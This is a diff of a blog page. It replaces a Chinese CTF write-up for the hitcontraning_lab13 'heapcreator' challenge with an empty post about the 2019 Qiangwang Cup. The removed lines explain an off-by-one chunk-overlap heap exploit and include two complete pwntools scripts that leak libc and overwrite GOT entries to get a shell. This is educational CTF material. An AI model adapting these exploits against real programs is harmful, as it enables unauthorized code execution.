@@ -73,7 +73,7 @@
 
 
 
-  <meta name="keywords" content="堆的利用（chunk_overlapping）,">
+  <meta name="keywords" content="ctf,pwn,堆,栈">
 
 
 
@@ -84,24 +84,14 @@
 
 
 
-<meta name="description" content="依然是wiki上的例题，先提供二进制源码：hitcontraning_lab13 预览： 文件是64位，partial relro则可以改写got表，感觉就像是堆题（名字也叫heapcreator）。。。没有pie调试起来会方便很多。。。然后放进ida64看一下大致功能。  前言分析：首先有两个setvbuf()设置好了标准输入和标准输出的缓冲区，所以程序不会在heap段设置chunk，然后打印一">
-<meta name="keywords" content="堆的利用（chunk_overlapping）">
 <meta property="og:type" content="article">
-<meta property="og:title" content="hitcontraning_lab13_writeup">
-<meta property="og:url" content="http://yoursite.com/2019/03/31/hitcontraning-lab13-writeup/index.html">
+<meta property="og:title" content="大型复盘：2019_强网杯线上赛部分pwn">
+<meta property="og:url" content="http://yoursite.com/2019/08/07/大型复盘：2019-强网杯线上赛部分pwn/index.html">
 <meta property="og:site_name" content="QingHe">
-<meta property="og:description" content="依然是wiki上的例题，先提供二进制源码：hitcontraning_lab13 预览： 文件是64位，partial relro则可以改写got表，感觉就像是堆题（名字也叫heapcreator）。。。没有pie调试起来会方便很多。。。然后放进ida64看一下大致功能。  前言分析：首先有两个setvbuf()设置好了标准输入和标准输出的缓冲区，所以程序不会在heap段设置chunk，然后打印一">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://i.loli.net/2019/04/01/5ca1b0b5a4769.png">
-<meta property="og:image" content="https://i.loli.net/2019/04/01/5ca1b21a80089.png">
-<meta property="og:image" content="https://i.loli.net/2019/04/01/5ca1c644d5cb5.png">
-<meta property="og:image" content="https://i.loli.net/2019/04/01/5ca1c5e7c4afc.png">
-<meta property="og:image" content="https://i.loli.net/2019/04/01/5ca1f5ad95924.jpg">
-<meta property="og:updated_time" content="2019-04-01T11:29:26.349Z">
+<meta property="og:updated_time" content="2019-08-07T08:56:22.361Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="hitcontraning_lab13_writeup">
-<meta name="twitter:description" content="依然是wiki上的例题，先提供二进制源码：hitcontraning_lab13 预览： 文件是64位，partial relro则可以改写got表，感觉就像是堆题（名字也叫heapcreator）。。。没有pie调试起来会方便很多。。。然后放进ida64看一下大致功能。  前言分析：首先有两个setvbuf()设置好了标准输入和标准输出的缓冲区，所以程序不会在heap段设置chunk，然后打印一">
-<meta name="twitter:image" content="https://i.loli.net/2019/04/01/5ca1b0b5a4769.png">
+<meta name="twitter:title" content="大型复盘：2019_强网杯线上赛部分pwn">
 
 
 
@@ -131,13 +121,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/03/31/hitcontraning-lab13-writeup/">
+  <link rel="canonical" href="http://yoursite.com/2019/08/07/大型复盘：2019-强网杯线上赛部分pwn/">
 
 
 
 
 
-  <title>hitcontraning_lab13_writeup | QingHe</title>
+  <title>大型复盘：2019_强网杯线上赛部分pwn | QingHe</title>
   
 
 
@@ -306,7 +296,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/31/hitcontraning-lab13-writeup/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/07/大型复盘：2019-强网杯线上赛部分pwn/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="xiaoxiaorenwu's blog">
@@ -323,7 +313,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">hitcontraning_lab13_writeup</h1>
+          <h1 class="post-title" itemprop="name headline">大型复盘：2019_强网杯线上赛部分pwn</h1>
         
 
         <div class="post-meta">
@@ -335,8 +325,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-31T23:28:18+08:00">
-                2019-03-31
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-07T16:56:22+08:00">
+                2019-08-07
               </time>
             
 
@@ -346,28 +336,6 @@
           </span>
 
           
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctf-writeups/" itemprop="url" rel="index">
-                    <span itemprop="name">ctf-writeups</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
 
           
             
@@ -376,8 +344,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2019/03/31/hitcontraning-lab13-writeup/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2019/03/31/hitcontraning-lab13-writeup/" itemprop="commentCount"></span>
+                <a href="/2019/08/07/大型复盘：2019-强网杯线上赛部分pwn/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/08/07/大型复盘：2019-强网杯线上赛部分pwn/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -404,7 +372,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1.4k
+                  0
                 </span>
               
 
@@ -420,7 +388,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  6 min
+                  1 min
                 </span>
               
             </div>
@@ -441,41 +409,7 @@
       
 
       
-        <p>依然是wiki上的例题，先提供二进制源码：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13" target="_blank" rel="noopener">hitcontraning_lab13</a></p>
-<h2 id="预览："><a href="#预览：" class="headerlink" title="预览："></a>预览：</h2><p><img src="https://i.loli.net/2019/04/01/5ca1b0b5a4769.png" alt="预览"></p>
-<p>文件是64位，partial relro则可以改写got表，感觉就像是堆题（名字也叫heapcreator）。。。没有pie调试起来会方便很多。。。然后放进ida64看一下大致功能。</p>
-<p><img src="https://i.loli.net/2019/04/01/5ca1b21a80089.png" alt=""></p>
-<h2 id="前言分析："><a href="#前言分析：" class="headerlink" title="前言分析："></a>前言分析：</h2><p>首先有两个setvbuf()设置好了标准输入和标准输出的缓冲区，所以程序不会在heap段设置chunk，然后打印一个菜单，之后就输入一个字符串，然后通过atoi()函数将字符串转换成数字，（<strong>这里可以想到如果将atoi_got改为system_addr后，直接输入‘/bin/sh\x00’就可以拿shell了</strong>），但是不幸的是他只可以输入4个字节。。。。但这一点后面能用上。</p>
-<h2 id="程序主要功能分析（寻找漏洞）："><a href="#程序主要功能分析（寻找漏洞）：" class="headerlink" title="程序主要功能分析（寻找漏洞）："></a>程序主要功能分析（寻找漏洞）：</h2><p>首先有四个主功能：create()，edit()，delete()，show()，当我们看到有edit和show存在的时候，这一题多半不会难，因为这两个函数为我们的泄露和篡改打下了基础，之后开始逐个分析。。</p>
-<p>在create()中我们可以发现当输入size的时候调用atoi()的时候可以输入8个字符串！！！nice，我们的设想得到了成立！<strong>所以我们的目标设为改写atoi_got为system_addr。</strong></p>
-<p><img src="https://i.loli.net/2019/04/01/5ca1c644d5cb5.png" alt=""></p>
-<p>在edit()功能中发现了off-by-one漏洞，通过这个我们可以实现chunk overlapping。</p>
-<p><img src="https://i.loli.net/2019/04/01/5ca1c5e7c4afc.png" alt=""></p>
-<p>show()则是正常的打印内容。</p>
-<p>delete()函数知识正常将chunk放入Bins，然后将指针归零，没有uaf漏洞。</p>
-<h2 id="利用漏洞来实现功能："><a href="#利用漏洞来实现功能：" class="headerlink" title="利用漏洞来实现功能："></a>利用漏洞来实现功能：</h2><h3 id="leak"><a href="#leak" class="headerlink" title="leak:"></a>leak:</h3><ol>
-<li><p>想要leak出libc，先考虑常用的泄露got表地址，因为show()功能是打印heap的content指针所指向的内容，所以想办法将content指针改为atoi_got，然后再show就可以泄露出Libc。</p>
-</li>
-<li><p>利用chunk overlapping来进行chunk的覆盖重叠，申请两个chunk，第一个chunk的作用是来改第二个heap结构体的大小（<strong>可以设计好使其正好和top_chunk接轨就省去了nextchunk的prev_inuse检查</strong>，例如我是申请一个content大小为0x10的chunk，然后将heap结构体的大小改为0x40），然后delete以后其会被放入对应的fastbin中，然后再申请与其大小对应（0x30）的heap，使heap结构体0x10申请到的内存位于之前content位于的地方。这就形成了覆盖。（经典的与unlink类似的，<strong>我改我自己形式，即通过漏洞利用使一个结构体中的一个指针指向自己地址前方的不远处，通过向那个地址编辑内容来达到修改自己的目的。</strong>）如下图所示：</p>
-<p><img src="https://i.loli.net/2019/04/01/5ca1f5ad95924.jpg" alt=""></p>
-<p>这就可以利用edit功能来改heap结构体的content指针。接着可以实现任意地址写的功能。</p>
-</li>
-</ol>
-<h3 id="change"><a href="#change" class="headerlink" title="change:"></a>change:</h3><ol>
-<li>泄露出libc以后就可以获得system_addr，然后利用任意地址写的功能将atoi_got改为system_addr，然后就利用之前说的方法来拿shell。</li>
-</ol>
-<h2 id="exp如下："><a href="#exp如下：" class="headerlink" title="exp如下："></a>exp如下：</h2><p>两种思路，只讲了第一种，第二种类似，只不过利用的是free(addr_’/bin/sh\x00’)：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./heapcreator'</span>)</span><br><span class="line">P = ELF(<span class="string">'./heapcreator'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">atoi_got=P.got[<span class="string">'atoi'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,payload)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">	p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(ID,payload)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">	p.sendline(str(ID))</span><br><span class="line">	p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">	p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(ID)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">	p.sendline(str(ID))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(ID)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">	p.sendline(str(ID))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x18</span></span><br><span class="line">create(<span class="number">0x18</span>,payload)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">create(<span class="number">0x10</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x18</span>+p8(<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x10</span> </span><br><span class="line">create(<span class="number">0x30</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x30</span>)+p64(atoi_got)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content : '</span>)</span><br><span class="line">atoi_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'atoi_addr='</span> + hex(atoi_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">libcbase = atoi_addr - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">log.success(<span class="string">'libcbase='</span> + hex(libcbase))</span><br><span class="line">system_addr=libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload=p64(system_addr)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)                                                                                               </span><br><span class="line">p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./heapcreator'</span>)</span><br><span class="line">P = ELF(<span class="string">'./heapcreator'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">free_got=P.got[<span class="string">'free'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,payload)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(ID,payload)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">	p.sendline(str(ID))</span><br><span class="line">	p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(ID)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">	p.sendline(str(ID))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(ID)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">	p.sendline(str(ID))</span><br><span class="line"></span><br><span class="line"><span class="comment">#先创建两个堆块，让前面的off-by-one后面的</span></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">'a'</span>*<span class="number">4</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">'a'</span>*<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'/bin/sh\x00'</span>+<span class="string">'a'</span>*<span class="number">0x10</span>+<span class="string">'\x41'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#往fastbin送块</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#再申请，使content覆盖heaparry[1]结构体的内容</span></span><br><span class="line">create(<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x30</span>)+p64(free_got))</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露libc</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content : '</span>)</span><br><span class="line">free_addr=u64(p.recv()[<span class="number">0</span>:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'free_addr='</span> + hex(free_addr))</span><br><span class="line">libcbase=free_addr-libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">system_addr=libcbase+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#将system_addr写入free_got里</span></span><br><span class="line">edit(<span class="number">1</span>,p64(system_addr))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="我第一次做的时候的一些心得："><a href="#我第一次做的时候的一些心得：" class="headerlink" title="我第一次做的时候的一些心得："></a>我第一次做的时候的一些心得：</h2><h3 id="hitconingtraining-lab13"><a href="#hitconingtraining-lab13" class="headerlink" title="hitconingtraining_lab13:"></a>hitconingtraining_lab13:</h3><ul>
-<li>这一题难度不大，但是还是没有独立做出来，需要再独立处理一遍。</li>
-<li>常见套路，申请书籍，然后用结构体储存书籍内容的指针和大小，结构体在堆上，书籍内容申请的空间也在堆上。</li>
-<li>有edit和print功能说明不难，用edit向书籍的内容指针里任意写，所以想办法将内容指针改为free_got，再调用edit功能将其内容改为system_addr。</li>
-<li>然后想改书籍的内容指针则需要控制结构体堆块，溢出和chunk overlapping都可以，溢出找不到，则为后者。</li>
-<li>利用off_by_one漏洞和fast_bin的机制，更改size of 第二本书结构体堆块，用第二本书的内容控制结构体堆块内容，更改其为free_got，然后edit书籍二。</li>
-<li>再考虑’/bin/sh’的位置，放在书籍一的内容里比较合适。system(addr_/bin/sh)，因为内容为/bin/sh所以free(ptr_des)的时候正好为system(addr__  /bin/sh)。</li>
-</ul>
-
+        
       
     </div>
     
@@ -524,7 +458,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://xiaoxiaorenwu.top/2019/03/31/hitcontraning-lab13-writeup/" title="hitcontraning_lab13_writeup">https://xiaoxiaorenwu.top/2019/03/31/hitcontraning-lab13-writeup/</a>
+    <a href="https://xiaoxiaorenwu.top/2019/08/07/大型复盘：2019-强网杯线上赛部分pwn/" title="大型复盘：2019_强网杯线上赛部分pwn">https://xiaoxiaorenwu.top/2019/08/07/大型复盘：2019-强网杯线上赛部分pwn/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -537,12 +471,6 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/堆的利用（chunk-overlapping）/" rel="tag"><i class="fa fa-tag"></i> 堆的利用（chunk_overlapping）</a>
-          
-        </div>
-      
 
       
       
@@ -552,8 +480,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/03/31/2016-Asis-books-writeup/" rel="next" title="2016-Asis-books_writeup">
-                <i class="fa fa-chevron-left"></i> 2016-Asis-books_writeup
+              <a href="/2019/08/07/大型复盘：2019-RCTF/" rel="next" title="大型复盘：2019_RCTF">
+                <i class="fa fa-chevron-left"></i> 大型复盘：2019_RCTF
               </a>
             
           </div>
@@ -561,10 +489,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/04/01/2015-hacklu-bookstore/" rel="prev" title="2015-hacklu-bookstore">
-                2015-hacklu-bookstore <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -619,17 +543,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -737,22 +652,6 @@
         </div>
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#预览："><span class="nav-number">1.</span> <span class="nav-text">预览：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#前言分析："><span class="nav-number">2.</span> <span class="nav-text">前言分析：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#程序主要功能分析（寻找漏洞）："><span class="nav-number">3.</span> <span class="nav-text">程序主要功能分析（寻找漏洞）：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用漏洞来实现功能："><span class="nav-number">4.</span> <span class="nav-text">利用漏洞来实现功能：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#leak"><span class="nav-number">4.1.</span> <span class="nav-text">leak:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#change"><span class="nav-number">4.2.</span> <span class="nav-text">change:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp如下："><span class="nav-number">5.</span> <span class="nav-text">exp如下：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#我第一次做的时候的一些心得："><span class="nav-number">6.</span> <span class="nav-text">我第一次做的时候的一些心得：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#hitconingtraining-lab13"><span class="nav-number">6.1.</span> <span class="nav-text">hitconingtraining_lab13:</span></a></li></ol></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
